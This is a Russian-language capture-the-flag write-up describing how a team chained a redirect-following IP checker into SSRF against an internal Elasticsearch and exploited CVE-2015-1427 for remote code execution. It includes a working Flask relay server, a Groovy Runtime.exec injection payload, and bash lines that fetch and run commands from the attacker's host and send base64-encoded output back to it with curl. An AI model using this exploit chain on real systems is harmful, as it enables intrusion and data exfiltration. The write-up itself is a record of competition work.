1. Обратили внимание на ссылки вида href="/show?id=q=_id:4" и подсказку в описании задачи о быстром поиске, про эластик мы поняли сииильно позже.
2. Чекалку ip натравили на свой сервак, получили инфу что прилажка на руби и реально ходит туда куда сказали
3. Дернулли постом /show?id=q=_id:5 получили 400 - поняли что там сенатра 
4. Погуглили rce увидили только две на path traversal и на xss через 400-ку. Потеряли много времени в попытке их реализовать.
5. Дошло наконец-то про эластик, полгуглили на тему elastic rce, нашли https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh
6. Проверили что бот реагирует на редиректы
7. Написали простенький сервер и bash скрипт
```python 
#!/usr/bin/python
from flask import Flask, request
from flask import Response
import requests
import sys
import requests, json

search = lambda p: requests.get("http://89.163.129.121:5000/check/_search", params={"source": json.dumps(p)}).text

app = Flask(__name__)

url = ""

@app.route("/save/<path:path>", methods=['POST', 'PUT'])
def saver(path):
    with open(path, 'wb') as f:
        f.write(request.stream.read().decode('base64'))
    return "saved"

@app.route("/cmd")
def cmd():
    with open('cmd', 'r') as cmd:
        resp = cmd.read()
    return resp

@app.route("/")
def hello():
    resp = Response('redirect')
    resp.headers['Location'] = url
    return resp, 302

@app.route("/check/<path:path>")
def check(path):
    global url
    url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
    req = requests.post("http://users.ctf2019.rocks/checkip", data={"ip":"http://89.163.129.121:5000"})
    return req.text, req.status_code

def inject(cmd):
    payload = {
        "script_fields": {
            "infophp": {
                "script":
                    '''java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getText()''' % cmd
            }
         }
    }
    search(payload)

if __name__ == "__main__":
    if sys.argv[1] == 'start':
	app.run(host='0.0.0.0', port=5000, threaded=True)
    else:
        inject(sys.argv[1])
```
```bash

echo "$1 | base64 | curl -d @- http://89.163.129.121:5000/save/output" > cmd
./users.py 'wget -O /tmp/very_secret_path http://89.163.129.121:5000/cmd'; ./users.py 'bash /tmp/very_secret_path '
cat output
```
7. В run.sh увидели путь к исходнику в котором был доп
9. Вытянули второй доп из эластика
```bash
./exec.sh 'curl http://localhost:9200/_cat/indices?v'
health status index   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   users     5   1         10            0     16.9kb         16.9kb
yellow open   secrets   5   1          1            0      3.1kb          3.1kb

./exec.sh 'curl http://localhost:9200/secrets/_search'
{"took":1,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":1,"max_score":1.0,"hits":[{"_index":"secrets","_type":"secret","_id":"1","_score":1.0,"_source":{"flag":"WGCTF{B0AFB09FAC06F96059631AD5D5F0D377}"}}]}}
```

 
